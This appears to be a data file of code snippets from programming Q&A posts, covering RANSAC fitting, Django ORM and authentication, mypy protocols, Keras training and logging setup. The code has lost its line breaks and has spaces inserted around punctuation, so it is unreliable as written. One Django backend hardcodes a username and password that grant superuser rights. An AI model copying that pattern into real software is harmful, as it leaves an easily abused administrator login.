1569196.87,1570197.5,1581198.12,1583198.75,1591199.37,1597200,1601200.62,1606202.5,1615203.12,1626203.75,1625204.37,1644205,1646205.62,1658206.25,1663206.87,1674207.5,1685208.12,1703208.75,1703209.37,1717210,1732210.62,1743211.25,1750211.87,1766212.5,1776213.12,1791213.75,1808214.37,1814215,1835215.62,1844216.25,1854216.87,1870217.5,1892218.12,1909218.75,1918219.37,1934220,1952220.62,1972221.87,2023222.5,2039223.12,2059223.75,2082225,2101225.62,2122226.25,2148226.87,2173227.5,2190228.12,2214228.75,2241229.37,2275230,2295230.62,2324231.25,2348231.87,2160232.5,2416233.12,2445233.75,2479234.37,2520235.62,2607236.25,2649236.87,2156237.5,2726238.12,2768238.75,2806239.37,2865240,2912240.62,2962241.25,3026241.87,3078242.5,3147243.12,3210243.75,3276244.37,3315245,3307245.62,3288246.25,3267246.87,3253247.5,3153248.75,4678249.37,4563250,4560250.62,4504251.25,4523251.87,4478252.5,4452253.12,4465253.75,4434254.37,4421255,4391255.62,4371256.25,4361256.87,4356257.5,4348258.12,4326258.75,4326259.37,4331260,4341260.62,4270261.25,4263261.87,4281262.5,2992263.12,2984263.75,2976264.37,2983265,2971265.62,2963266.25,2963266.87,2967267.5,2968268.12,2951268.75,2951270,2959270.62,2953271.25,2500271.87,5514272.5,2839273.12,2706273.75,2721274.37,2693288.12,3010288.75,2999289.37,2998290,3020290.62,3036291.25,3083291.87,3169292.5,3170293.12,3196293.75,3212294.37,3230295,3234295.62,3262296.25,3273296.87,3298297.5,3318298.12,3333298.75,3356299.37,3374300,3394300.62,3417301.25,3427301.87,3453302.5,3474303.12,3490303.75,3516304.37,3552305,3571305.62,3581307.5,5224308.12,5271308.75,5316309.37,5411310,3843310.62,3892311.25,3907311.87,3922312.5,3985313.12,4016313.75,4058315,4081315.62,4143316.25,4190316.87,4230317.5,4291318.12,4353318.75,4406319.37,4460320,4512320.62,4563321.25,4507321.87,4473322.5,4426323.12,4398323.75,4371324.37,4321325,4274325.62,4256326.25,4215326.87,4194327.5,4148328.12,4104328.75,4077329.37,4051330,4024330.62,3995331.25,3971331.87,3932332.5,3909333.12,3898333.75,3884334.37,3858335,3840335.62,3818336.25,3791337.5,3765338.12,3747338.75,3720339.37,3715340,3689340.62,3687341.25,3635341.87,3632342.5,3624343.12,3613343.75,3613344.37,3594345,3595345.62,3560346.25,3570346.87,3543347.5,3555348.12,3527348.75,3512349.37,3512350,3521350.62,3486351.25,3496351.87,3477352.5,3487353.12,3461353.75,3460354.37,3458355,3453355.62,3460356.25,3448357.5,998358.12,3442 import numpy as npfrom matplotlib import pyplot as pltimport pandas as pdfrom sklearn import linear_model , datasetsimport math # scan data is stored in a txt file and getting data from that text filedf = pd.read_csv ( 'scanData.txt ' , delimiter= ' , ' ) angle = df.values [ : ,0 ] distance = df.values [ : ,1 ] cartesian = [ ( r*math.cos ( phi*math.pi/180 ) , r*math.sin ( phi*math.pi/180 ) ) for r , phi in zip ( distance , angle ) ] x , y = map ( list , zip ( *cartesian ) ) # print ( x ) # coverting this into 2d arrayx= np.array ( x ) y= np.array ( y ) x=x.reshape ( -1 , 1 ) y=y.reshape ( -1 , 1 ) lr = linear_model.LinearRegression ( ) lr.fit ( x , y ) ransac = linear_model.RANSACRegressor ( max_trials=1000 , min_samples=300 ) ransac.fit ( x , y ) # Predict data of estimated modelsline_X = np.arange ( x.min ( ) , x.max ( ) ) [ : , np.newaxis ] print ( line_X ) line_y = lr.predict ( line_X ) line_y_ransac = ransac.predict ( line_X ) print ( line_y_ransac ) plt.scatter ( x , y , color='yellowgreen ' , marker= ' . ' , label='Inliers ' ) plt.plot ( line_X , line_y_ransac , color='cornflowerblue ' , linewidth=1 , label='RANSAC regressor ' ) plt.legend ( loc='lower right ' ) plt.xlabel ( `` Input '' ) plt.ylabel ( `` Response '' ) plt.show ( )"
"S= [ ] study=set ( [ 524287 ] ) tmax=10**7D= { } DF= { } dudcount=0callcount=0def matchval ( t1 , t2 ) : if t1==t2 : global dudcount dudcount+=1 else : global callcount callcount+=1 D.setdefault ( t1 , set ( [ ] ) ) D.setdefault ( t2 , set ( [ ] ) ) D [ t1 ] .add ( t2 ) if t1 in D [ t2 ] : DF.setdefault ( t1 , set ( [ ] ) ) DF [ t1 ] .add ( t2 ) DF.setdefault ( t2 , set ( [ ] ) ) DF [ t2 ] .add ( t1 ) for k in xrange ( 27 ) : t1= ( 100003 - 200003* ( 2*k+1 ) + 300007* ( 2*k+1 ) **3 ) % ( 1000000 ) S.append ( t1 ) t2= ( 100003 - 200003* ( 2*k+2 ) + 300007* ( 2*k+2 ) **3 ) % ( 1000000 ) S.append ( t2 ) matchval ( t1 , t2 ) t1= ( 100003 - 200003* ( 55 ) + 300007* ( 55 ) **3 ) % ( 1000000 ) S.append ( t1 ) t2= ( S [ 31 ] +S.pop ( 0 ) ) % ( 1000000 ) S.append ( t2 ) matchval ( t1 , t2 ) for k in xrange ( 29 , tmax+1 ) : t1= ( S [ 31 ] +S.pop ( 0 ) ) % ( 1000000 ) S.append ( t1 ) t2= ( S [ 31 ] +S.pop ( 0 ) ) % ( 1000000 ) S.append ( t2 ) matchval ( t1 , t2 ) D.setdefault ( 524287 , set ( [ ] ) ) DF.setdefault ( 524287 , set ( [ ] ) ) print D [ 524287 ] print DF [ 524287 ] print dudcount , callcountprint `` Done '' $ time python 186.py set ( [ 810528L , 582178L , 49419L , 214483L , 974071L , 651738L , 199163L , 193791L ] ) set ( [ ] ) 11 9999989Done real 34m18.642suser 2m26.465ssys 0m11.645s"
"def _makearray ( a ) : new = asarray ( a ) wrap = getattr ( a , `` __array_prepare__ '' , new.__array_wrap__ ) return new , wrap At the end of every ufunc , this method is called on the input object with the highest array priority , or the output object if one was specified . The ufunc- computed array is passed in and whatever is returned is passed to the user . Subclasses inherit a default implementation of this method , which transforms the array into a new instance of the object ’ s class . Subclasses may opt to use this method to transform the output array into an instance of the subclass and update metadata before returning the array to the user . **a , wrap = _makearray ( a ) ** _assertRankAtLeast2 ( a ) _assertNdSquareness ( a ) t , result_t = _commonType ( a ) if a.shape [ -1 ] == 0 : # The inner array is 0x0 , the ufunc can not handle this case **return wrap ( empty_like ( a , dtype=result_t ) ) ** signature = 'D- > D ' if isComplexType ( t ) else 'd- > d ' extobj = get_linalg_error_extobj ( _raise_linalgerror_singular ) ainv = _umath_linalg.inv ( a , signature=signature , extobj=extobj ) return wrap ( ainv.astype ( result_t ) )"
"import calendarfrom datetime import datetimeimport rethinkdb as rdef datetime_to_epoch_time ( dt ) : timestamp = calendar.timegm ( dt.utctimetuple ( ) ) return r.epoch_time ( timestamp ) title = u'foobar'published_at = '2014-03-17 14:00 ' # firts I convert 2014-03-17 14:00 to datetimedt = datetime.strptime ( published_at , ' % Y- % m- % d % H : % M ' ) # then I store the resultr.table ( 'stories ' ) .insert ( { 'title ' : title , 'published_at ' : datetime_to_epoch_time ( dt ) , } ) .run ( )"
"foo ( 2,42,23,2,2 )"
"# ! /usr/bin/pythonimport timeimport datetimeif __name__ == `` __main__ '' : print ( datetime.datetime.now ( ) ) print ( datetime.datetime.today ( ) ) print ( datetime.datetime.fromtimestamp ( time.time ( ) ) ) 2017-11-29 22:47:35.3399142017-11-29 22:47:35.3403992017-11-29 22:47:35.340399 Wed , Nov 29 , 2017 3:47:43 PM print ( time.altzone ) print ( time.timezone ) print ( time.tzname ) -36000 ( 'Ame ' , 'ric ' )"
"a = { 'key1 ' : 'value1 ' , 'key2 ' : 42 , 'key3 ' : foo ( 20 ) } def foo ( max ) : `` '' '' Returns random float between 0 and max . '' '' '' return max*random.random ( ) a_processes = { 'key1 ' : 'value1 ' , 'key2 ' : 42 , 'key3 ' : 12.238746374 } a = { 'key1 ' : 'value1 ' , 'key2 ' : 42 , 'key3 ' : foo } a = { 'key1 ' : 'value1 ' , 'key2 ' : 42 , 'key3 ' : [ foo , 20 ] } a_processed = dict ( [ k , process ( v ) ] for k , v in a.items ( ) )"
print ( 'true ' ) if False else print ( 'false ' ) def p ( t ) : print ( t ) p ( 'true ' ) if False else p ( 'false ' )
"class Foo : pass def bar ( o : Union [ Foo , Type [ Foo ] ] ) : print ( 1 ) TypeError Traceback ( most recent call last ) < ipython-input-161-2a8355efa688 > in < module > ( ) -- -- > 1 def bar ( o : Union [ Foo , Type [ Foo ] ] ) : 2 print ( 1 ) 3 /usr/lib/python3.5/typing.py in __getitem__ ( self , parameters ) 550 parameters = ( parameters , ) 551 return self.__class__ ( self.__name__ , self.__bases__ , -- > 552 dict ( self.__dict__ ) , parameters , _root=True ) 553 554 def __eq__ ( self , other ) : /usr/lib/python3.5/typing.py in __new__ ( cls , name , bases , namespace , parameters , _root ) 510 continue 511 if any ( isinstance ( t2 , type ) and issubclass ( t1 , t2 ) -- > 512 for t2 in all_params - { t1 } if not isinstance ( t2 , TypeVar ) ) : 513 all_params.remove ( t1 ) 514 # It 's not a union if there 's only one type left./usr/lib/python3.5/typing.py in < genexpr > ( .0 ) 510 continue 511 if any ( isinstance ( t2 , type ) and issubclass ( t1 , t2 ) -- > 512 for t2 in all_params - { t1 } if not isinstance ( t2 , TypeVar ) ) : 513 all_params.remove ( t1 ) 514 # It 's not a union if there 's only one type left./usr/lib/python3.5/typing.py in __subclasscheck__ ( self , cls ) 1075 return True 1076 # If we break out of the loop , the superclass gets a chance.- > 1077 if super ( ) .__subclasscheck__ ( cls ) : 1078 return True 1079 if self.__extra__ is None or isinstance ( cls , GenericMeta ) : /home/alexey/dev/gcore/django/lib/python3.5/abc.py in__subclasscheck__ ( cls , subclass ) 223 return True 224 # Check if it 's a subclass of a subclass ( recursive ) -- > 225 for scls in cls.__subclasses__ ( ) : 226 if issubclass ( subclass , scls ) : 227 cls._abc_cache.add ( subclass ) TypeError : descriptor '__subclasses__ ' of 'type ' object needs an argument"
"# models.pyclass Game ( AbstractContentModel , AbstractScoreModel ) : name = models.CharField ( _ ( `` name '' ) , max_length=100 , blank=True ) developer = models.CharField ( _ ( 'Developer ' ) , max_length=255 ) distributor = models.CharField ( _ ( 'Distributor ' ) , max_length=255 , blank=True ) # ... reviews = models.ManyToManyField ( Review , related_name= '' games '' , blank=True , verbose_name=_ ( `` Reviews '' ) ) videos = models.ManyToManyField ( Video , related_name= '' games '' , blank=True , verbose_name=_ ( `` Videos '' ) ) images = models.ManyToManyField ( Image , related_name= '' games '' , blank=True , verbose_name=_ ( `` Gallery '' ) ) # views.pyqs = Game.objects.all ( ) qs = qs.annotate ( video_count=models.Count ( 'videos ' ) ) qs = qs.annotate ( review_count=models.Count ( 'reviews ' ) ) qs = qs.annotate ( image_count=models.Count ( 'images ' ) ) SELECT `` content_game '' . `` id '' , `` content_game '' . '' name '' , '' content_game '' . `` developer '' , `` content_game '' . '' distributor '' , COUNT ( `` content_game_videos '' . `` video_id '' ) AS `` video_count '' , COUNT ( `` content_game_reviews '' . `` review_id '' ) AS `` review_count '' , COUNT ( `` content_game_images '' . `` image_id '' ) AS `` image_count '' FROM `` content_game '' LEFT OUTER JOIN `` content_game_videos '' ON ( `` content_game '' . `` id '' = `` content_game_videos '' . `` game_id '' ) LEFT OUTER JOIN `` content_game_reviews '' ON ( `` content_game '' . `` id '' = `` content_game_reviews '' . `` game_id '' ) LEFT OUTER JOIN `` content_game_images '' ON ( `` content_game '' . `` id '' = `` content_game_images '' . `` game_id '' ) GROUP BY `` content_game '' . `` id '' , `` content_game '' . '' name '' , '' content_game '' . `` developer '' , `` content_game '' . `` distributor '' ;"
"original = { 1 : { } ,2 : { 101 : '' OneZeroOne '' ,202 : '' TwoZeroTwo '' } } result = { } for key in original : if not key in result : result [ str ( key ) ] = { } for i , value in original [ key ] .items ( ) : result [ str ( key ) ] [ str ( i ) ] = valueprint result { ' 1 ' : { } , ' 2 ' : { '202 ' : 'TwoZeroTwo ' , '101 ' : 'OneZeroOne ' } }"
"In [ 98 ] : A=pd.DataFrame ( np.arange ( 9 . ) .reshape ( 3,3 ) , columns=list ( 'abc ' ) ) In [ 99 ] : AOut [ 99 ] : a b c0 0 1 21 3 4 52 6 7 8In [ 100 ] : B=A.copy ( ) In [ 104 ] : pd.merge ( A , B , left_index=True , right_index=True ) Out [ 104 ] : a_x b_x c_x a_y b_y c_y0 0 1 2 0 1 21 3 4 5 3 4 52 6 7 8 6 7 8 In [ 104 ] : < < one or more statements > > Out [ 104 ] : A B a b c a b c0 0 1 2 0 1 21 3 4 5 3 4 52 6 7 8 6 7 8"
"import sixfrom abc import ABCMetafrom abc import abstractmethodclass Base ( six.with_metaclass ( ABCMeta ) ) : def __init__ ( self ) : print ( 'Init abstract base ' ) @ abstractmethod def do_something ( self ) : passclass Subclass ( Base ) : def __init__ ( self ) : super ( Subclass , self ) .__init__ ( ) def do_something ( self ) : print ( 'Done . ' ) sub = Subclass ( ) sub.do_something ( ) from abc import abstractmethodclass Base ( object ) : def __init__ ( self ) : print ( 'Init abstract base ' ) @ abstractmethod def do_something ( self ) : passclass Subclass ( Base ) : def __init__ ( self ) : super ( Subclass , self ) .__init__ ( ) def do_something ( self ) : print ( 'Done . ' ) sub = Subclass ( ) sub.do_something ( )"
"import cv2cap = cv2.VideoCapture ( `` my_test.ravi '' ) if not cap.isOpened ( ) : print ( `` Error opening video stream or file '' ) while cap.isOpened ( ) : ret , frame = cap.read ( ) if ret : cv2.imshow ( 'Frame ' , frame ) if cv2.waitKey ( 25 ) & 0xFF == ord ( ' q ' ) : breakcap.release ( ) cv2.destroyAllWindows ( ) 00000000 52 49 46 46 F8 B1 C6 3F 41 56 49 20 4C 49 53 54 RIFF ... ? AVI LIST00000010 CC 7F 00 00 68 64 72 6C 61 76 69 68 38 00 00 00 ... .hdrlavih8 ... 00000020 12 7A 00 00 44 FF DD 00 00 02 00 00 10 08 00 00 .z..D ... ... ... ..00000030 44 6D 00 00 00 00 00 00 01 00 00 00 08 65 09 00 Dm ... ... ... ..e..00000040 80 02 00 00 E1 01 00 00 00 00 00 00 00 00 00 00 ... ... ... ... ... .00000050 00 00 00 00 00 00 00 00 4C 49 53 54 74 7E 00 00 ... ... ..LISTt~..00000060 73 74 72 6C 73 74 72 68 38 00 00 00 76 69 64 73 strlstrh8 ... vids00000070 59 55 59 32 00 00 00 00 00 00 00 00 00 00 00 00 YUY2 ... ... ... ... 00000080 B4 C4 04 00 80 96 98 00 00 00 00 00 A4 50 00 00 ... ... ... ... .P..00000090 08 65 09 00 00 00 00 00 00 00 00 00 00 00 00 00 .e ... ... ... ... ..000000A0 00 00 00 00 73 74 72 66 28 00 00 00 28 00 00 00 ... .strf ( ... ( ... 000000B0 80 02 00 00 E1 01 00 00 01 00 10 00 59 55 59 32 ... ... ... ... YUY2000000C0 00 65 09 00 60 00 00 00 60 00 00 00 00 00 00 00 .e.. ` ... ` ... ... .000000D0 00 00 00 00 69 6E 64 78 F8 7D 00 00 04 00 00 00 ... .indx . } ... ... 000000E0 06 00 00 00 30 30 64 62 00 00 00 00 00 00 00 00 ... .00db ... ... .. # coding=utf-8import avimport osravi_path = `` Brake disc.ravi '' container = av.open ( ravi_path ) stream = container.streams.video [ 0 ] stream.codec_context.skip_frame = 'NONKEY'tgt_path = `` frames '' if not os.path.isdir ( tgt_path ) : os.makedirs ( tgt_path ) for frame in container.decode ( stream ) : tgt_filename = os.path.join ( tgt_path , 'frame- { :09d } .jpg'.format ( frame.pts ) ) print ( frame , tgt_filename ) frame.to_image ( ) .save ( tgt_filename , quality=80 ) > > > python ravi_test2.py ( < av.VideoFrame # 0 , pts=0 yuyv422 160x121 at 0x7f501bfa8598 > , 'frames/frame-000000000.jpg ' ) ( < av.VideoFrame # 1 , pts=1 yuyv422 160x121 at 0x7f501bfa8600 > , 'frames/frame-000000001.jpg ' ) ( < av.VideoFrame # 2 , pts=2 yuyv422 160x121 at 0x7f5018e0fdb8 > , 'frames/frame-000000002.jpg ' ) ( < av.VideoFrame # 3 , pts=3 yuyv422 160x121 at 0x7f501bfa8598 > , 'frames/frame-000000003.jpg ' ) ( < av.VideoFrame # 4 , pts=4 yuyv422 160x121 at 0x7f501bfa8600 > , 'frames/frame-000000004.jpg ' ) ( < av.VideoFrame # 5 , pts=5 yuyv422 160x121 at 0x7f5018e0fdb8 > , 'frames/frame-000000005.jpg ' )"
"pluginModule = imp.load_source ( pluginModuleName , pluginModulePath ) # Load the module class and initialize it.if hasattr ( pluginModule , pluginClassName ) : try : pluginClassInst = getattr ( pluginModule , pluginClassName ) ( ) except Exception as e : errorMsg = ( 'In plugin module [ { } ] , { } '.format ( os.path.basename ( pluginModulePath ) , e ) ) exceptionTracePrint ( self._log ) self._log.error ( errorMsg ) continue pluginModule = importlib.machinery.SourceFileLoader ( pluginModuleName , pluginModulePath ) .load_module ( ) pluginModule = importlib.machinery.SourceFileLoader ( pluginModuleName , pluginModulePath ) .load_module ( ) AttributeError : 'module ' object has no attribute 'machinery ' pluginModuleTmp = importlib.util.spec_from_file_location ( pluginModuleName , pluginModulePath )"
"[ loggers ] keys=root , aLogger , bLogger [ handlers ] keys=consoleHandler [ formatters ] keys= [ logger_root ] level=NOTSEThandlers=consoleHandler [ logger_aLogger ] level=DEBUGhandlers=consoleHandlerpropagate=0qualname=a [ logger_bLogger ] level=INFOhandlers=consoleHandlerpropagate=0qualname=b [ handler_consoleHandler ] class=StreamHandlerargs= ( sys.stderr , ) import loggingimport logging.configlogging.config.fileConfig ( 'logger.conf ' ) a_log = logging.getLogger ( ' a.submod ' ) b_log = logging.getLogger ( ' b.submod ' ) def function_one ( ) : b_log.info ( `` function_one ( ) called . '' ) import loggingimport logging.configlogging.config.fileConfig ( 'logger.conf ' ) a_log = logging.getLogger ( ' a.submod ' ) b_log = logging.getLogger ( ' b.submod ' ) def function_two ( ) : a_log.info ( `` function_two ( ) called . '' ) from module_one import function_onefrom module_two import function_twofunction_one ( ) function_two ( ) $ python2.5 logger.py $ $ python2.6 logger.pyfunction_one ( ) called.function_two ( ) called. $"
"import osos.environ [ `` CUDA_VISIBLE_DEVICES '' ] = `` 3 '' import numpy as npfrom model import Deeplabv3import tensorflow as tfimport timeimport tensorboardimport kerasfrom keras.preprocessing.image import img_to_arrayfrom keras.applications import imagenet_utilsfrom keras.preprocessing.image import ImageDataGeneratorfrom keras.callbacks import TensorBoardconfig = tf.ConfigProto ( ) config.gpu_options.allow_growth = Truesession = tf.Session ( config=config ) from keras import backend as KK.set_session ( session ) NAME = `` DeepLab- { } '' .format ( int ( time.time ( ) ) ) deeplab_model = Deeplabv3 ( input_shape= ( 300,200,3 ) , classes=3 ) tensorboard = TensorBoard ( log_dir= '' logpath/ { } '' .format ( NAME ) ) deeplab_model.compile ( loss= '' categorical_crossentropy '' , optimizer= '' adam '' , metrics= [ 'accuracy ' ] ) # we create two instances with the same argumentsdata_gen_args = dict ( featurewise_center=True , featurewise_std_normalization=True , rotation_range=90 , width_shift_range=0.1 , height_shift_range=0.1 , zoom_range=0.2 ) image_datagen = ImageDataGenerator ( **data_gen_args ) mask_datagen = ImageDataGenerator ( **data_gen_args ) # Provide the same seed and keyword arguments to the fit and flow methodsseed = 1 # image_datagen.fit ( images , augment=True , seed=seed ) # mask_datagen.fit ( masks , augment=True , seed=seed ) image_generator = image_datagen.flow_from_directory ( '/path/Input/ ' , target_size= ( 300,200 ) , class_mode=None , seed=seed ) mask_generator = mask_datagen.flow_from_directory ( '/path/Label/ ' , target_size= ( 300,200 ) , class_mode=None , seed=seed ) # combine generators into one which yields image and maskstrain_generator = zip ( image_generator , mask_generator ) print ( `` compiled '' ) # deeplab_model.fit ( X , y , batch_size=32 , epochs=10 , validation_split=0.3 , callbacks= [ tensorboard ] ) deeplab_model.fit_generator ( train_generator , steps_per_epoch= np.uint32 ( 2935 / 32 ) , epochs=10 , callbacks= [ tensorboard ] ) print ( `` finish fit '' ) deeplab_model.save_weights ( 'deeplab_1.h5 ' ) deeplab_model.save ( 'deeplab-1 ' ) session.close ( ) from matplotlib import pyplot as pltimport cv2 # used for resize . if you dont have it , use anything elseimport numpy as npfrom model import Deeplabv3import tensorflow as tffrom PIL import Image , ImageEnhancedeeplab_model = Deeplabv3 ( input_shape= ( 512,512,3 ) , classes=3 ) # deeplab_model = Deeplabv3 ( ) img = Image.open ( `` Path/Input/0/0001.png '' ) imResize = img.resize ( ( 512,512 ) , Image.ANTIALIAS ) imResize = np.array ( imResize ) img2 = cv2.cvtColor ( imResize , cv2.COLOR_GRAY2RGB ) w , h , _ = img2.shaperatio = 512 . / np.max ( [ w , h ] ) resized = cv2.resize ( img2 , ( int ( ratio*h ) , int ( ratio*w ) ) ) resized = resized / 127.5 - 1.pad_x = int ( 512 - resized.shape [ 0 ] ) resized2 = np.pad ( resized , ( ( 0 , pad_x ) , ( 0,0 ) , ( 0,0 ) ) , mode='constant ' ) res = deeplab_model.predict ( np.expand_dims ( resized2,0 ) ) labels = np.argmax ( res.squeeze ( ) , -1 ) plt.imshow ( labels [ : -pad_x ] ) plt.show ( )"
"SELECT a.foo , b.baz , a.bar FROM TABLE_A a LEFT JOIN TABLE_B b ON a.id = b.id WHERE baz = 'snafu ' ; //fake PHPish $ results [ 'select-columns ' ] = Array [ a.foo , b.baz , a.bar ] ; $ results [ 'tables ' ] = Array [ TABLE_A , TABLE_B ] ; $ results [ 'table-aliases ' ] = Array [ a= > TABLE_A , b= > TABLE_B ] ; //etc ..."
"import numpy as npimport matplotlib.pyplot as pltt = np.linspace ( -1 , 1 , 101 ) X , Y = np.meshgrid ( t , 2*t ) Z = np.sin ( 2*np.pi* ( X**2+Y**2 ) ) fig , axx = plt.subplots ( 1 , 2 ) axx [ 0 ] .set_title ( `` imshow ( ) '' ) axx [ 0 ] .imshow ( Z , origin='lower ' , aspect='auto ' , extent= [ -1 , 1 , -2 , 2 ] ) axx [ 1 ] .set_title ( `` pcolormesh ( ) '' ) axx [ 1 ] .pcolormesh ( X , Y , Z ) fig.tight_layout ( ) plt.show ( )"
from __future__ import absolute_import
QuerySet.filter ( myfk__child__onetoone__another__manytomany__relation__monster__relationship__mycustomlookup= ' : P ' ) QuerySet.filter ( ** { 'myfk__child__onetoone__another ' '__manytomany__relation__monster ' '__relationship__mycustomlookup ' : ' : P ' } )
not ( 5 > 7 ) == True True == not ( 5 > 7 )
"from dataclasses import dataclassfrom typing import Union , ClassVar , TypeVar , Generic , Typefrom typing_extensions import Protocol_P = TypeVar ( '_P ' , bound='PType ' ) class PType ( Protocol ) : @ classmethod def maximum_type_value ( cls : Type [ _P ] ) - > _P : ... @ classmethod def minimum_type_value ( cls : Type [ _P ] ) - > _P : ... def predecessor ( self : _P ) - > _P : ... def successor ( self : _P ) - > _P : ... @ dataclassclass MyInteger : value : int _MAX : ClassVar [ int ] = 42 _MIN : ClassVar [ int ] = -42 def __post_init__ ( self ) - > None : if not ( self._MIN < = self.value < = self._MAX ) : msg = f '' Integers must be in range [ { self._MIN } , { self._MAX } ] '' raise ValueError ( msg ) @ classmethod def maximum_type_value ( cls ) - > MyInteger : return MyInteger ( cls._MAX ) @ classmethod def minimum_type_value ( cls ) - > MyInteger : return MyInteger ( cls._MIN ) def predecessor ( self ) - > MyInteger : return MyInteger ( self.value - 1 ) def successor ( self ) - > MyInteger : return MyInteger ( self.value + 1 ) @ dataclassclass Interval ( Generic [ _P ] ) : low : _P high : _Pinterval = Interval ( MyInteger ( 1 ) , MyInteger ( 2 ) ) def foo ( x : PType ) - > PType : return xfoo ( MyInteger ( 42 ) ) ( py37 ) Juans-MacBook-Pro : juan $ mypy mcve.pymcve.py:46 : error : Value of type variable `` _P '' of `` Interval '' can not be `` MyInteger '' mcve.py:49 : error : Argument 1 to `` foo '' has incompatible type `` MyInteger '' ; expected `` PType '' mcve.py:49 : note : Following member ( s ) of `` MyInteger '' have conflicts : mcve.py:49 : note : Expected : mcve.py:49 : note : def maximum_type_value ( cls ) - > < nothing > mcve.py:49 : note : Got : mcve.py:49 : note : def maximum_type_value ( cls ) - > MyIntegermcve.py:49 : note : Expected : mcve.py:49 : note : def minimum_type_value ( cls ) - > < nothing > mcve.py:49 : note : Got : mcve.py:49 : note : def minimum_type_value ( cls ) - > MyInteger _P = TypeVar ( '_P ' , bound='PType ' ) class PType ( Protocol ) : @ classmethod def maximum_type_value ( cls ) - > _P : ... @ classmethod def minimum_type_value ( cls ) - > _P : ... def predecessor ( self : _P ) - > _P : ... def successor ( self : _P ) - > _P : ... mcve.py:46 : error : Value of type variable `` _P '' of `` Interval '' can not be `` MyInteger '' mcve.py:49 : error : Argument 1 to `` foo '' has incompatible type `` MyInteger '' ; expected `` PType '' mcve.py:49 : note : Following member ( s ) of `` MyInteger '' have conflicts : mcve.py:49 : note : Expected : mcve.py:49 : note : def [ _P < : PType ] maximum_type_value ( cls ) - > _Pmcve.py:49 : note : Got : mcve.py:49 : note : def maximum_type_value ( cls ) - > MyIntegermcve.py:49 : note : Expected : mcve.py:49 : note : def [ _P < : PType ] minimum_type_value ( cls ) - > _Pmcve.py:49 : note : Got : mcve.py:49 : note : def minimum_type_value ( cls ) - > MyInteger _P = TypeVar ( '_P ' , bound='PType ' ) class PType ( Protocol ) : def maximum_type_value ( self : _P ) - > _P : ... def minimum_type_value ( self : _P ) - > _P : ... def predecessor ( self : _P ) - > _P : ... def successor ( self : _P ) - > _P : ... @ dataclassclass MyInteger : value : int _MAX : ClassVar [ int ] = 42 _MIN : ClassVar [ int ] = -42 def __post_init__ ( self ) - > None : if not ( self._MIN < = self.value < = self._MAX ) : msg = f '' Integers must be in range [ { self._MIN } , { self._MAX } ] '' raise ValueError ( msg ) def maximum_type_value ( self ) - > MyInteger : return MyInteger ( self._MAX ) def minimum_type_value ( self ) - > MyInteger : return MyInteger ( self._MIN ) def predecessor ( self ) - > MyInteger : return MyInteger ( self.value - 1 ) def successor ( self ) - > MyInteger : return MyInteger ( self.value + 1 ) C = TypeVar ( ' C ' , bound='Copyable ' ) class Copyable ( Protocol ) : def copy ( self : C ) - > C : class One : def copy ( self ) - > 'One ' : ... T = TypeVar ( 'T ' , bound='Other ' ) class Other : def copy ( self : T ) - > T : ... c : Copyablec = One ( ) # OKc = Other ( ) # Also OK T = TypeVar ( 'T ' , bound= ' C ' ) class C : @ classmethod def factory ( cls : Type [ T ] ) - > T : # make a new instance of clsclass D ( C ) : ... d = D.factory ( ) # type here should be D"
"d = { 'name ' : [ 'bob ' , 'john ' , 'harry ' , 'mary ' ] , 'age ' : [ 13 , 19 , 23 ] , 'height ' : [ 164 , 188 ] , 'job ' : [ 'programmer ' ] } d2 = [ { 'name ' : 'bob ' , 'age ' : 13 , 'height ' : 164 , 'job ' : 'programmer ' } , { 'name ' : 'john ' , 'age ' : 19 , 'height ' : 188 } , { 'name ' : 'harry ' , 'age ' : 23 } , { 'name ' : 'mary ' } ] d2 = [ dict ( zip ( d , t ) ) for t in zip ( *d.values ( ) ) ] d2 = [ { 'name ' : 'bob ' , 'age ' : 13 , 'height ' : 164 , 'job ' : 'programmer ' } ]"
"from django.contrib.auth.models import Userclass SettingsBackend ( object ) : def authenticate ( self , request , username=None , password=None ) : user_name = 'user_name ' user_password = 'user_pass ' login_valid = ( user_name == username ) pwd_valid = ( password == user_password ) if login_valid and pwd_valid : try : user = User.objects.get ( username=username ) except User.DoesNotExist : user = User ( username=username ) user.is_staff = True user.is_superuser = True user.save ( ) return user return None def get_user ( self , user_id ) : try : return User.objects.get ( pk=user_id ) except User.DoesNotExist : return None AUTHENTICATION_BACKENDS = ( 'myProject.authentication.SettingsBackend ' , ) INSTALLED_APPS = [ 'django.contrib.auth ' , 'django.contrib.contenttypes ' , 'django.contrib.sessions ' , 'django.contrib.messages ' , 'django.contrib.staticfiles ' , 'django.contrib.humanize ' , 'default ' , ] MIDDLEWARE = [ 'django.middleware.security.SecurityMiddleware ' , 'django.contrib.sessions.middleware.SessionMiddleware ' , 'django.middleware.common.CommonMiddleware ' , 'django.middleware.csrf.CsrfViewMiddleware ' , 'django.contrib.auth.middleware.AuthenticationMiddleware ' , 'django.contrib.messages.middleware.MessageMiddleware ' , 'django.middleware.clickjacking.XFrameOptionsMiddleware ' , ] TEMPLATES = [ { 'BACKEND ' : 'django.template.backends.django.DjangoTemplates ' , 'DIRS ' : [ `` templates/ '' ] , 'APP_DIRS ' : True , 'OPTIONS ' : { 'context_processors ' : [ 'django.template.context_processors.debug ' , 'django.template.context_processors.request ' , 'django.contrib.auth.context_processors.auth ' , 'django.contrib.messages.context_processors.messages ' , ] , } , } , ] DATABASES = { 'default ' : { 'ENGINE ' : 'django.db.backends.sqlite3 ' , 'NAME ' : os.path.join ( BASE_DIR , 'db.sqlite3 ' ) , } } # Password validation # https : //docs.djangoproject.com/en/1.10/ref/settings/ # auth-password-validatorsAUTH_PASSWORD_VALIDATORS = [ { 'NAME ' : 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator ' , } , { 'NAME ' : 'django.contrib.auth.password_validation.MinimumLengthValidator ' , } , { 'NAME ' : 'django.contrib.auth.password_validation.CommonPasswordValidator ' , } , { 'NAME ' : 'django.contrib.auth.password_validation.NumericPasswordValidator ' , } , ] LOGIN_REDIRECT_URL = '/'LOGIN_URL = '/login'LOGOUT_URL = '/logout'ADMIN_ENABLED = False from django.contrib.sessions.models import SessionSession.objects.all ( ) .delete ( ) from django.contrib.auth.models import Useruser = User.objects.get ( username='user_name ' ) > > DoesNotExist : User matching query does not exist ."
"void func ( std : :function < void ( A , B ) > callback ) { ... } typedef void ( *callback_t ) ( int , int , void* ) ; void func ( callback_t callback , void *user_data ) { callback ( 1 , 2 , user_data ) ; }"
"reader = csv.reader ( open ( 'test_results.csv ' , ' r ' ) ) for row in reader : TestResult ( type=row [ 0 ] , name=row [ 1 ] , result=row [ 2 ] ) .save ( )"
